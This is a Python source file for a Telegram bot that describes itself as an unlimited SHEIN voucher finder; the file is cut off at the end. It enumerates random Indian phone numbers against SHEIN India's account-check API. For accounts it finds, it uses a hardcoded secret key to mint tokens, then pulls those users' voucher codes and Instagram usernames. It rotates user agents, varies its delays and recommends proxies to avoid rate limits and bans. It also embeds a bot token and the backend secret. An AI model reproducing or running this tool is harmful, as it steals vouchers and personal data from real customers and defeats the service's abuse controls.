import asyncio
import aiohttp
import json
import random
import logging
from datetime import datetime
from typing import Dict, Optional, List
from dataclasses import dataclass
import pandas as pd
from io import StringIO, BytesIO
import time

# Telegram Bot
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telegram.constants import ParseMode
import nest_asyncio

# Apply nest_asyncio to allow nested event loops
nest_asyncio.apply()

# ===============================================================
# CONFIGURATION - UNLIMITED MODE
# ===============================================================
TELEGRAM_BOT_TOKEN = "7006581021:AAFSgAd2b5ptcJTaL2cJjIFiImDjhqGjTBE"  # Replace with your bot token
ADMIN_USER_IDS = [8430984338]  # Add your Telegram user IDs here
OUTPUT_FILE = "vouchers.csv"
LOG_FILE = "voucher_bot.log"

# API Configuration - OPTIMIZED FOR UNLIMITED CHECKING
API_TIMEOUT = 8
CONCURRENT_REQUESTS = 8      # Balanced for speed and success
CHECK_BATCH_SIZE = 12        # Batch size
BATCH_DELAY = 1.5            # Delay between batches
MIN_REQUEST_DELAY = 0.2      # Minimum delay between requests
MAX_REQUEST_DELAY = 0.4      # Maximum delay between requests

# User-Agent Rotation
USER_AGENTS = [
    "Dalvik/2.1.0 (Linux; U; Android 14; SM-G991B Build/UP1A.231005.007)",
    "Dalvik/2.1.0 (Linux; U; Android 13; SM-S901B Build/TP1A.220624.014)",
    "Dalvik/2.1.0 (Linux; U; Android 12; SM-F936B Build/SP1A.210812.016)",
    "Dalvik/2.1.0 (Linux; U; Android 11; SM-G781B Build/RP1A.200720.012)",
    "Dalvik/2.1.0 (Linux; U; Android 10; SM-G980F Build/QP1A.190711.020)",
    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973F Build/PPR1.180610.011)",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-N960F Build/M1AJQ)",
]

# ===============================================================
# Setup Logging
# ===============================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ===============================================================
# Data Classes
# ===============================================================
@dataclass
class VoucherResult:
    phone_number: str
    username: str
    voucher_code: str
    voucher_amount: str
    expiry_date: str
    found_at: datetime
    status: str = "FOUND"
    
    def to_dict(self):
        return {
            "phone_number": self.phone_number,
            "username": self.username,
            "voucher_code": self.voucher_code,
            "voucher_amount": self.voucher_amount,
            "expiry_date": self.expiry_date,
            "found_at": self.found_at.isoformat(),
            "status": self.status
        }

@dataclass
class CheckStats:
    total_checked: int = 0
    registered_found: int = 0
    vouchers_found: int = 0
    rate_limited: int = 0
    errors: int = 0
    consecutive_failures: int = 0
    success_rate: float = 0.0
    start_time: Optional[datetime] = None
    active_tasks: int = 0
    checks_per_hour: int = 0
    
    def get_speed(self):
        if not self.start_time:
            return 0
        elapsed = (datetime.now() - self.start_time).total_seconds()
        return self.total_checked / elapsed if elapsed > 0 else 0
    
    def update_success_rate(self):
        if self.total_checked > 0:
            successful = self.total_checked - self.rate_limited - self.errors
            self.success_rate = (successful / self.total_checked) * 100
    
    def get_checks_per_hour(self):
        if not self.start_time:
            return 0
        elapsed_hours = (datetime.now() - self.start_time).total_seconds() / 3600
        return int(self.total_checked / elapsed_hours) if elapsed_hours > 0 else 0

# ===============================================================
# Fast Voucher Checker Class - UNLIMITED MODE (UPDATED)
# ===============================================================
class FastVoucherChecker:
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.client_token: Optional[str] = None
        self.stats = CheckStats()
        self.running = False
        self.found_vouchers: List[VoucherResult] = []
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        self.check_task = None
        self.continuous_mode = False
        self.last_request_time = 0
        self.last_success_time = time.time()
        self.adaptive_delay = BATCH_DELAY
        self.consecutive_rate_limits = 0
        
    def get_random_user_agent(self):
        """Get random user agent"""
        return random.choice(USER_AGENTS)
    
    async def adaptive_delay_manager(self):
        """Manage adaptive delays based on success rate"""
        current_time = time.time()
        
        # Reset consecutive rate limits if we had success
        if current_time - self.last_success_time < 30:
            self.consecutive_rate_limits = max(0, self.consecutive_rate_limits - 1)
        
        # If too many consecutive rate limits, increase delay significantly
        if self.consecutive_rate_limits > 10:
            self.adaptive_delay = min(self.adaptive_delay * 2.0, 30.0)
            logger.warning(f"Many consecutive rate limits, increasing delay to {self.adaptive_delay:.1f}s")
        
        # If too many failures, increase delay
        elif self.stats.consecutive_failures > 8:
            self.adaptive_delay = min(self.adaptive_delay * 1.5, 20.0)
            logger.warning(f"Many failures, increasing delay to {self.adaptive_delay:.1f}s")
        
        # If successful recently, slowly reduce delay
        elif current_time - self.last_success_time < 60:
            self.adaptive_delay = max(self.adaptive_delay * 0.95, 0.5)
        
        # Ensure minimum delay between requests
        if self.last_request_time > 0:
            elapsed = time.time() - self.last_request_time
            if elapsed < MIN_REQUEST_DELAY:
                wait_time = MIN_REQUEST_DELAY - elapsed
                await asyncio.sleep(wait_time)
        
        self.last_request_time = time.time()
    
    async def init_session(self):
        """Initialize aiohttp session"""
        if not self.session or self.session.closed:
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=API_TIMEOUT),
                connector=aiohttp.TCPConnector(limit=CONCURRENT_REQUESTS, ssl=False)
            )
    
    def generate_number(self) -> str:
        """Generate random Indian mobile number"""
        return random.choice(["6", "7", "8", "9"]) + ''.join(random.choices("0123456789", k=9))
    
    async def get_client_token(self) -> str:
        """Get client token from API - UPDATED URL AND HEADERS"""
        url = "https://api.services.sheinindia.in/uaas/jwt/token/client"  # Updated URL
        
        headers = {
            "Client_type": "Android/35",  # Updated from Android/29
            "Client_version": "1.0.13",   # Updated from 1.0.8
            "X-Tenant-Id": "SHEIN",
            "X-Tenant": "B2C",
            "Ad_id": ''.join(random.choices('0123456789abcdef', k=16)),
            "Content-Type": "application/x-www-form-urlencoded",
            "accept": "application/json",  # Added header
            "accept-encoding": "gzip",     # Added header
            "User-Agent": self.get_random_user_agent(),
        }
        data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret"
        
        try:
            await self.adaptive_delay_manager()
            
            async with self.session.post(url, data=data, headers=headers) as response:
                if response.status == 200:
                    result = await response.json()
                    token = result.get("access_token")
                    if token:
                        self.stats.consecutive_failures = 0
                        self.consecutive_rate_limits = 0
                        self.last_success_time = time.time()
                        return token
                elif response.status == 429:
                    logger.warning("Rate limited while getting client token")
                    self.stats.rate_limited += 1
                    self.stats.consecutive_failures += 1
                    self.consecutive_rate_limits += 1
        except Exception as e:
            logger.error(f"Error getting client token: {e}")
            self.stats.errors += 1
            self.stats.consecutive_failures += 1
        
        raise Exception("Failed to get client token")
    
    async def check_registered(self, number: str) -> tuple[bool, Optional[str]]:
        """Check if number is registered - UPDATED URL AND METHOD"""
        url = "https://api.services.sheinindia.in/uaas/accountCheck"  # Updated URL
        
        headers = {
            "Authorization": f"Bearer {self.client_token}",
            "Requestid": "account_check",
            "X-Tenant": "B2C",
            "Client_type": "Android/35",  # Updated from Android/29
            "Client_version": "1.0.13",   # Updated from 1.0.8
            "X-Tenant-Id": "SHEIN",
            "Ad_id": ''.join(random.choices('0123456789abcdef', k=16)),
            "Content-Type": "application/x-www-form-urlencoded",
            "accept": "application/json",  # Added header
            "accept-encoding": "gzip",     # Added header
            "User-Agent": self.get_random_user_agent(),
        }
        
        # Send data in request body instead of URL parameters
        data = {"mobileNumber": number}
        
        try:
            await self.adaptive_delay_manager()
            
            async with self.session.post(url, data=data, headers=headers) as response:  # Changed to data=data
                self.stats.total_checked += 1
                
                if response.status == 429:
                    self.stats.rate_limited += 1
                    self.stats.consecutive_failures += 1
                    self.consecutive_rate_limits += 1
                    
                    # If rate limited, wait longer
                    wait_time = random.uniform(2, min(5 + self.consecutive_rate_limits, 15))
                    await asyncio.sleep(wait_time)
                    return False, None
                
                if response.status == 200:
                    result = await response.json()
                    if result.get("success", False):
                        self.stats.registered_found += 1
                        self.stats.consecutive_failures = 0
                        self.consecutive_rate_limits = 0
                        self.last_success_time = time.time()
                        return True, result.get("encryptedId")
                    else:
                        # Not registered is not a failure
                        self.stats.consecutive_failures = max(0, self.stats.consecutive_failures - 1)
                        self.consecutive_rate_limits = max(0, self.consecutive_rate_limits - 1)
                        
                else:
                    logger.debug(f"Unexpected status {response.status} for number: {number}")
                    self.stats.errors += 1
                    self.stats.consecutive_failures += 1
                    
        except Exception as e:
            self.stats.errors += 1
            self.stats.consecutive_failures += 1
            logger.debug(f"Error checking {number}: {e}")
        
        return False, None
    
    async def try_voucher(self, number: str, enc_id: str) -> Optional[VoucherResult]:
        """Try to get voucher for registered number - UPDATED HEADERS"""
        # Step 1: Get creator token
        url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token"
        
        headers = {
            "Client_type": "Android/35",  # Updated from Android/29
            "Client_version": "1.0.13",   # Updated from 1.0.8
            "X-Tenant-Id": "SHEIN",
            "Ad_id": ''.join(random.choices('0123456789abcdef', k=16)),
            "Content-Type": "application/json; charset=UTF-8",
            "accept": "application/json",  # Added header
            "accept-encoding": "gzip",     # Added header
            "Origin": "https://sheinverse.galleri5.com",
            "Referer": "https://sheinverse.galleri5.com/",
            "User-Agent": self.get_random_user_agent(),
        }
        payload = {
            "client_type": "Android/35",  # Updated from Android/29
            "client_version": "1.0.13",   # Updated from 1.0.8
            "gender": random.choice(["MALE", "FEMALE", ""]),  # Randomized gender
            "phone_number": number,
            "secret_key": "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
            "user_id": enc_id,
            "user_name": ""
        }
        
        try:
            await self.adaptive_delay_manager()
            
            async with self.session.post(url, json=payload, headers=headers) as response:
                if response.status != 200:
                    return None
                
                result = await response.json()
                creator_token = result.get("access_token") or result.get("token")
                if not creator_token:
                    return None
                
                # Step 2: Get user profile with voucher
                profile_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user"
                profile_headers = {
                    "Authorization": f"Bearer {creator_token}",
                    "Origin": "https://sheinverse.galleri5.com",
                    "Referer": "https://sheinverse.galleri5.com/",
                    "X-Requested-With": "com.ril.shein",
                    "Accept": "*/*",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 15; I2219 Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36",  # Updated User-Agent
                    "accept-encoding": "gzip, deflate, br, zstd",  # Added header
                    "pragma": "no-cache",
                    "cache-control": "no-cache",
                }
                
                await self.adaptive_delay_manager()
                
                async with self.session.get(profile_url, headers=profile_headers) as profile_response:
                    if profile_response.status == 200:
                        profile_data = await profile_response.json()
                        ud = profile_data.get("user_data") or profile_data.get("data") or profile_data
                        ig = ud.get("instagram_data", {})
                        vc = ud.get("voucher_data", {})
                        
                        un = ig.get("username", "").strip()
                        code = vc.get("voucher_code", "").strip()
                        
                        if un and code and code != "N/A":
                            self.stats.vouchers_found += 1
                            self.stats.consecutive_failures = 0
                            self.consecutive_rate_limits = 0
                            self.last_success_time = time.time()
                            return VoucherResult(
                                phone_number=number,
                                username=un,
                                voucher_code=code,
                                voucher_amount=vc.get('voucher_amount', 'N/A'),
                                expiry_date=vc.get('expiry_date', 'N/A'),
                                found_at=datetime.now()
                            )
        except Exception as e:
            logger.debug(f"Error getting voucher for {number}: {e}")
            self.stats.errors += 1
            self.stats.consecutive_failures += 1
        
        return None
    
    async def check_single_number(self, number: str = None) -> Optional[VoucherResult]:
        """Check a single number (or generate random)"""
        if not number:
            number = self.generate_number()
        
        registered, enc_id = await self.check_registered(number)
        if registered:
            return await self.try_voucher(number, enc_id)
        return None
    
    async def check_batch(self, batch_size: int = CHECK_BATCH_SIZE):
        """Check multiple numbers - UNLIMITED"""
        tasks = []
        for _ in range(min(batch_size, CONCURRENT_REQUESTS)):
            task = asyncio.create_task(self.check_single_number())
            tasks.append(task)
            # Small delay between creating tasks
            await asyncio.sleep(random.uniform(0.05, 0.15))
        
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Process results
            for result in results:
                if isinstance(result, VoucherResult):
                    self.found_vouchers.append(result)
                    await self.save_voucher(result)
    
    def start_continuous_check(self):
        """Start continuous checking - UNLIMITED"""
        if self.running:
            return
        
        self.running = True
        self.continuous_mode = True
        self.stats = CheckStats(start_time=datetime.now())
        
        # Run in background thread
        asyncio.run_coroutine_threadsafe(self._continuous_check_unlimited(), self.loop)
        logger.info("Started UNLIMITED CONTINUOUS CHECKING")
    
    async def _continuous_check_unlimited(self):
        """Continuous checking with NO LIMITS"""
        await self.init_session()
        
        try:
            self.client_token = await self.get_client_token()
        except Exception as e:
            logger.error(f"Failed to get client token: {e}")
            self.running = False
            return
        
        batch_count = 0
        last_voucher_count = 0
        
        while self.running:
            try:
                batch_count += 1
                
                # Check batch
                self.stats.active_tasks = CONCURRENT_REQUESTS
                await self.check_batch(CONCURRENT_REQUESTS)
                self.stats.active_tasks = 0
                
                # Update statistics
                self.stats.update_success_rate()
                self.stats.checks_per_hour = self.stats.get_checks_per_hour()
                
                # Log progress
                speed = self.stats.get_speed()
                new_vouchers = self.stats.vouchers_found - last_voucher_count
                
                logger.info(f"Batch {batch_count}: "
                          f"Total={self.stats.total_checked:,}, "
                          f"Vouchers={self.stats.vouchers_found} (+{new_vouchers}), "
                          f"Success={self.stats.success_rate:.1f}%, "
                          f"Speed={speed:.1f}/sec")
                
                last_voucher_count = self.stats.vouchers_found
                
                # Adaptive delay between batches
                current_delay = self.adaptive_delay
                
                # Adjust delay based on success rate
                if self.stats.success_rate < 40 and batch_count > 5:
                    current_delay = min(current_delay * 1.4, 25.0)
                    logger.warning(f"Low success rate ({self.stats.success_rate:.1f}%), "
                                 f"increasing delay to {current_delay:.1f}s")
                elif self.stats.success_rate > 70:
                    current_delay = max(current_delay * 0.9, 0.8)
                
                # Add random variation
                delay = random.uniform(current_delay * 0.7, current_delay * 1.3)
                await asyncio.sleep(delay)
                
                # Refresh client token every 40 batches
                if batch_count % 40 == 0:
                    try:
                        self.client_token = await self.get_client_token()
                        logger.info("Refreshed client token")
                    except:
                        logger.warning("Failed to refresh client token")
                        await asyncio.sleep(5)
                
                # Take short break every 25 batches to prevent overheating
                if batch_count % 25 == 0:
                    break_duration = random.uniform(3, 8)
                    logger.info(f"Taking a {break_duration:.1f}s break...")
                    await asyncio.sleep(break_duration)
                
                # If success rate is very low, take longer break
                if self.stats.success_rate < 20 and self.stats.total_checked > 100:
                    logger.warning(f"Very low success rate ({self.stats.success_rate:.1f}%), "
                                 f"taking 30s break to reset")
                    await asyncio.sleep(30)
                    self.consecutive_rate_limits = 0
                    self.adaptive_delay = BATCH_DELAY * 2
                
            except Exception as e:
                logger.error(f"Error in continuous check: {e}")
                self.stats.errors += 1
                
                # Wait longer on error
                await asyncio.sleep(15)
                
                # Reinitialize session if needed
                if self.session and self.session.closed:
                    await self.init_session()
    
    async def stop_check(self):
        """Stop ongoing check"""
        self.running = False
        self.continuous_mode = False
        self.stats.active_tasks = 0
        
        # Close session
        if self.session:
            await self.session.close()
            self.session = None
    
    async def save_voucher(self, voucher: VoucherResult):
        """Save voucher to CSV file"""
        try:
            voucher_dict = voucher.to_dict()
            df = pd.DataFrame([voucher_dict])
            
            try:
                existing_df = pd.read_csv(OUTPUT_FILE)
                updated_df = pd.concat([existing_df, df], ignore_index=True)
            except FileNotFoundError:
                updated_df = df
            
            updated_df.to_csv(OUTPUT_FILE, index=False)
            logger.info(f"Voucher found! {voucher.phone_number} -> {voucher.voucher_code}")
            
        except Exception as e:
            logger.error(f"Error saving voucher: {e}")
    
    def get_stats_message(self) -> str:
        """Get formatted statistics message"""
        speed = self.stats.get_speed()
        checks_per_hour = self.stats.get_checks_per_hour()
        
        return f"""
<b>VOUCHER FINDER STATS (UNLIMITED MODE)</b>

<b>Total Checked:</b> <code>{self.stats.total_checked:,}</code>
<b>Registered Users:</b> <code>{self.stats.registered_found:,}</code>
<b>Vouchers Found:</b> <code>{self.stats.vouchers_found:,}</code>
<b>Rate Limited:</b> <code>{self.stats.rate_limited:,}</code>
<b>Errors:</b> <code>{self.stats.errors:,}</code>

<b>Success Rate:</b> <code>{self.stats.success_rate:.1f}%</code>
<b>Speed:</b> <code>{speed:.1f}</code> checks/second
<b>Checks/Hour:</b> <code>{checks_per_hour:,}</code>
<b>Active Tasks:</b> <code>{self.stats.active_tasks}</code>

<b>Status:</b> <code>{"RUNNING" if self.running else "STOPPED"}</code>
<b>Uptime:</b> <code>{((datetime.now() - self.stats.start_time).total_seconds() if self.stats.start_time else 0):.0f}</code> seconds
<b>Mode:</b> <code>{"CONTINUOUS" if self.continuous_mode else "BATCH"}</code>
<b>Adaptive Delay:</b> <code>{self.adaptive_delay:.1f}s</code>

<b>UNLIMITED MODE ACTIVE - NO DAILY LIMITS</b>
"""
    
    def get_vouchers_list(self, limit: int = 10) -> str:
        """Get formatted list of found vouchers"""
        if not self.found_vouchers:
            return "No vouchers found yet."
        
        recent_vouchers = self.found_vouchers[-limit:]
        message = "<b>RECENT VOUCHERS:</b>\n\n"
        
        for i, voucher in enumerate(recent_vouchers, 1):
            message += f"<b>{i}. {voucher.phone_number}</b>\n"
            message += f"   <code>{voucher.username}</code>\n"
            message += f"   <code>{voucher.voucher_code}</code> ({voucher.voucher_amount})\n"
            message += f"   {voucher.expiry_date}\n\n"
        
        message += f"\n<b>Total Found:</b> {len(self.found_vouchers)} vouchers"
        return message
    
    def start_event_loop(self):
        """Start the event loop in a separate thread"""
        import threading
        thread = threading.Thread(target=self._run_event_loop, daemon=True)
        thread.start()
        return thread
    
    def _run_event_loop(self):
        """Run the event loop"""
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()

# ===============================================================
# Telegram Bot Handlers (UPDATED)
# ===============================================================
class VoucherBot:
    def __init__(self):
        self.checker = FastVoucherChecker()
        self.app = None
        # Start checker's event loop in background
        self.checker.start_event_loop()
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Send welcome message"""
        keyboard = [
            [
                InlineKeyboardButton("START UNLIMITED", callback_data="start_continuous"),
                InlineKeyboardButton("LIVE STATS", callback_data="stats"),
            ],
            [
                InlineKeyboardButton("SHOW VOUCHERS", callback_data="list_vouchers"),
                InlineKeyboardButton("STOP CHECKING", callback_data="stop_check"),
            ],
            [
                InlineKeyboardButton("EXPORT CSV", callback_data="export_csv"),
                InlineKeyboardButton("CHECK SINGLE", callback_data="check_single"),
            ],
            [
                InlineKeyboardButton("PERFORMANCE", callback_data="performance_info"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        welcome_text = """
<b>UNLIMITED SHEIN VOUCHER FINDER</b>

<u>Features:</u>
NO DAILY LIMITS - Runs 24/7
Adaptive rate limiting
Smart delay management
Continuous checking
Auto-save to CSV

<u>Performance Settings:</u>
Concurrent Requests: 8
Batch Delay: 1.5s
Checks/Hour: 2,000-3,000 expected
Success Target: 50-70%

<u>Expected Results (24hrs):</u>
Total Checks: 50,000-70,000
Vouchers Found: 50-100+
Continuous Operation

<u>Click START UNLIMITED to begin 24/7 checking!</u>

<u>Important:</u> Bot auto-adjusts to avoid bans.
"""
        
        await update.message.reply_text(
            welcome_text,
            reply_markup=reply_markup,
            parse_mode=ParseMode.HTML
        )
    
    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button clicks"""
        query = update.callback_query
        await query.answer()
        
        if query.data == "start_continuous":
            await self.start_continuous_handler(update, context)
        elif query.data == "stats":
            await self.stats_handler(update, context)
        elif query.data == "list_vouchers":
            await self.list_vouchers_handler(update, context)
        elif query.data == "stop_check":
            await self.stop_check_handler(update, context)
        elif query.data == "export_csv":
            await self.export_csv_handler(update, context)
        elif query.data == "check_single":
            await query.message.reply_text(
                "Please send a phone number to check (format: 1234567890)"
            )
        elif query.data == "performance_info":
            await self.performance_info_handler(update, context)
    
    async def start_continuous_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start continuous check immediately"""
        query = update.callback_query
        
        if self.checker.running:
            await query.message.reply_text(
                "Check is already running! Use /stats to see progress.",
                parse_mode=ParseMode.HTML
            )
            return
        
        # Start immediately
        await query.message.reply_text(
            "<b>STARTING UNLIMITED 24/7 CHECKING...</b>\n\n"
            "<u>Unlimited Mode Active:</u>\n"
            f"Concurrent Requests: <code>{CONCURRENT_REQUESTS}</code>\n"
            f"Batch Delay: <code>{BATCH_DELAY}s</code>\n"
            f"Daily Limit: <code>DISABLED</code>\n"
            f"Runtime: <code>24/7 UNTIL STOPPED</code>\n\n"
            "<u>Expected Performance:</u>\n"
            "2,000-3,000 checks/hour\n"
            "50,000-70,000 checks/day\n"
            "Auto-adjusts for best results\n\n"
            "<u>Bot will run continuously until you stop it!</u>\n"
            "Use /stats to monitor live progress!",
            parse_mode=ParseMode.HTML
        )
        
        # Start continuous checking
        self.checker.start_continuous_check()
        
        # Update button to show status
        keyboard = [
            [
                InlineKeyboardButton("UNLIMITED RUNNING", callback_data="stats"),
                InlineKeyboardButton("LIVE STATS", callback_data="stats"),
            ],
            [
                InlineKeyboardButton("SHOW VOUCHERS", callback_data="list_vouchers"),
                InlineKeyboardButton("STOP CHECKING", callback_data="stop_check"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.edit_reply_markup(reply_markup=reply_markup)
    
    async def performance_info_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show performance information"""
        query = update.callback_query
        await query.answer()
        
        performance_info = f"""
<b>PERFORMANCE INFORMATION</b>

<u>Current Settings:</u>
Concurrent Requests: <code>{CONCURRENT_REQUESTS}</code>
Batch Size: <code>{CHECK_BATCH_SIZE}</code>
Batch Delay: <code>{BATCH_DELAY}s</code>
Min Request Delay: <code>{MIN_REQUEST_DELAY}s</code>
Max Request Delay: <code>{MAX_REQUEST_DELAY}s</code>

<u>Expected Performance:</u>
<b>Checks/Hour:</b> 2,000-3,000
<b>Checks/Day (24hrs):</b> 50,000-70,000
<b>Success Rate:</b> 50-70%
<b>Vouchers/Day:</b> 50-100+

<u>Adaptive Features:</u>
Auto-delay adjustment based on success rate
Longer breaks when rate limited
Token auto-refresh
Session recovery on errors

<u>Safety Measures:</u>
User-Agent rotation ({len(USER_AGENTS)} variants)
Exponential backoff on failures
Consecutive failure tracking
Success rate monitoring

<u>Real-time Statistics:</u>
Total Checked: <code>{self.checker.stats.total_checked:,}</code>
Success Rate: <code>{self.checker.stats.success_rate:.1f}%</code>
Current Speed: <code>{self.checker.stats.get_speed():.1f}</code>/sec
Checks/Hour: <code>{self.checker.stats.get_checks_per_hour():,}</code>

<u>To Maximize Performance:</u>
1. Use residential IP (not datacenter)
2. Monitor success rate in /stats
3. Let bot auto-adjust delays
4. Consider adding proxies for 85%+ success
"""
        
        await query.message.reply_text(
            performance_info,
            parse_mode=ParseMode.HTML
        )
    
    async def stats_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show statistics"""
        query = update.callback_query
        if query:
            await query.answer()
        
        stats_message = self.checker.get_stats_message()
        
        # Add refresh button
        keyboard = [[
            InlineKeyboardButton("REFRESH STATS", callback_data="stats"),
            InlineKeyboardButton("STOP", callback_data="stop_check") if self.checker.running else 
            InlineKeyboardButton("START", callback_data="start_continuous")
        ]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if query:
            await query.message.reply_text(
                stats_message,
                reply_markup=reply_markup,
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                stats_message,
                reply_markup=reply_markup,
                parse_mode=ParseMode.HTML
            )
    
    async def list_vouchers_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """List found vouchers"""
        query = update.callback_query
        await query.answer()
        
        vouchers_message = self.checker.get_vouchers_list()
        
        # Add navigation buttons
        keyboard = [[
            InlineKeyboardButton("BACK TO STATS", callback_data="stats"),
            InlineKeyboardButton("CONTINUE CHECKING", callback_data="start_continuous") if not self.checker.running else 
            InlineKeyboardButton("STOP", callback_data="stop_check")
        ]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.reply_text(
            vouchers_message,
            reply_markup=reply_markup,
            parse_mode=ParseMode.HTML
        )
    
    async def stop_check_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Stop ongoing check"""
        query = update.callback_query
        await query.answer()
        
        if self.checker.running:
            # Run stop in checker's event loop
            asyncio.run_coroutine_threadsafe(self.checker.stop_check(), self.checker.loop)
            
            # Update button
            keyboard = [[
                InlineKeyboardButton("START AGAIN", callback_data="start_continuous"),
                InlineKeyboardButton("FINAL STATS", callback_data="stats"),
            ]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            checks_per_hour = self.checker.stats.get_checks_per_hour()
            
            await query.message.reply_text(
                "<b>UNLIMITED CHECKING STOPPED!</b>\n\n"
                f"<u>Final 24/7 Results:</u>\n"
                f"Total Checked: <code>{self.checker.stats.total_checked:,}</code>\n"
                f"Vouchers Found: <code>{self.checker.stats.vouchers_found}</code>\n"
                f"Success Rate: <code>{self.checker.stats.success_rate:.1f}%</code>\n"
                f"Average Speed: <code>{checks_per_hour:,}</code>/hour\n\n"
                "Bot ran with NO DAILY LIMITS.\n"
                "Use /stats to see full results.",
                reply_markup=reply_markup,
                parse_mode=ParseMode.HTML
            )
            
            # Update original message buttons
            original_keyboard = [
                [
                    InlineKeyboardButton("START UNLIMITED", callback_data="start_continuous"),
                    InlineKeyboardButton("LIVE STATS", callback_data="stats"),
                ],
                [
                    InlineKeyboardButton("SHOW VOUCHERS", callback_data="list_vouchers"),
                    InlineKeyboardButton("EXPORT CSV", callback_data="export_csv"),
                ]
            ]
            original_reply_markup = InlineKeyboardMarkup(original_keyboard)
            
            try:
                await query.message.edit_reply_markup(reply_markup=original_reply_markup)
            except:
                pass  # Ignore if message can't be edited
        else:
            await query.message.reply_text("No check is currently running.")
    
    async def export_csv_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Export vouchers to CSV"""
        query = update.callback_query
        await query.answer()
        
        try:
            # Read CSV and send as document
            with open(OUTPUT_FILE, 'rb') as f:
                await query.message.reply_document(
                    document=f,
                    filename="vouchers_export.csv",
                    caption="<b>VOUCHERS EXPORT</b>\n\nTotal vouchers exported.",
                    parse_mode=ParseMode.HTML
                )
        except FileNotFoundError:
            await query.message.reply_text("No vouchers found yet!")
        except Exception as e:
            await query.message.reply_text(f"Error exporting: {str(e)}")
    
    async def check_single_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Check a single phone number"""
        if context.args:
            number = context.args[0]
            if not number.isdigit() or len(number) != 10:
                await update.message.reply_text("Please provide a valid 10-digit phone number")
                return
            
            await update.message.reply_text(f"Checking number: <code>{number}</code>...", parse_mode=ParseMode.HTML)
            
            try:
                # Run in checker's event loop
                future = asyncio.run_coroutine_threadsafe(
                    self._check_single_async(number), 
                    self.checker.loop
                )
                
                # Wait for result with timeout
                result = future.result(timeout=15)
                
                if result:
                    message = f"""
<b>VOUCHER FOUND!</b>

<b>Number:</b> <code>{result.phone_number}</code>
<b>Username:</b> <code>{result.username}</code>
<b>Voucher:</b> <code>{result.voucher_code}</code> ({result.voucher_amount})
<b>Expires:</b> {result.expiry_date}
"""
                    await update.message.reply_text(message, parse_mode=ParseMode.HTML)
                else:
                    await update.message.reply_text("No voucher found for this number")
            except Exception as e:
                await update.message.reply_text(f"Error: {str(e)}")
        else:
            await update.message.reply_text("Usage: <code>/check_single 1234567890</code>", parse_mode=ParseMode.HTML)
    
    async def _check_single_async(self, number: str) -> Optional[VoucherResult]:
        """Async method to check single number"""
        await self.checker.init_session()
        if not self.checker.client_token:
            self.checker.client_token = await self.checker.get_client_token()
        
        return await self.checker.check_single_number(number)
    
    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Stop command"""
        if self.checker.running:
            asyncio.run_coroutine_threadsafe(self.checker.stop_check(), self.checker.loop)
            await update.message.reply_text("<b>Check stopped successfully!</b>", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text("No check is currently running.")
    
    async def export_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Export command"""
        await self.export_csv_handler(update, context)
    
    async def handle_number_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle direct number input"""
        number = update.message.text.strip()
        
        if number.isdigit() and len(number) == 10:
            await self.check_single_command(update, context)
    
    def setup_handlers(self, application: Application):
        """Setup all bot handlers"""
        # Command handlers
        application.add_handler(CommandHandler("start", self.start))
        application.add_handler(CommandHandler("stats", self.stats_handler))
        application.add_handler(CommandHandler("check_single", self.check_single_command))
        application.add_handler(CommandHandler("stop", self.stop_command))
        application.add_handler(CommandHandler("export", self.export_command))
        
        # Button handlers
        application.add_handler(CallbackQueryHandler(self.button_handler))
        
        # Message handler for direct number input
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_number_input))
    
    async def run(self):
        """Run the bot"""
        # Create application
        self.app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        
        # Setup handlers
        self.setup_handlers(self.app)
        
        # Start bot
        logger.info("Unlimited Mode Bot started. Press Ctrl+C to stop.")
        await self.app.initialize()
        await self.app.start()
        await self.app.updater.start_polling()
        
        # Keep running
        await asyncio.Event().wait()
    
    async def shutdown(self):
        """Shutdown bot gracefully"""
        # Stop checking if running
        if self.checker.running:
            await self.checker.stop_check()
        
        # Stop bot
        if self.app:
            await self.app.stop()
            await self.app.shutdown()
        
        # Stop checker's event loop
        if self.checker.loop:
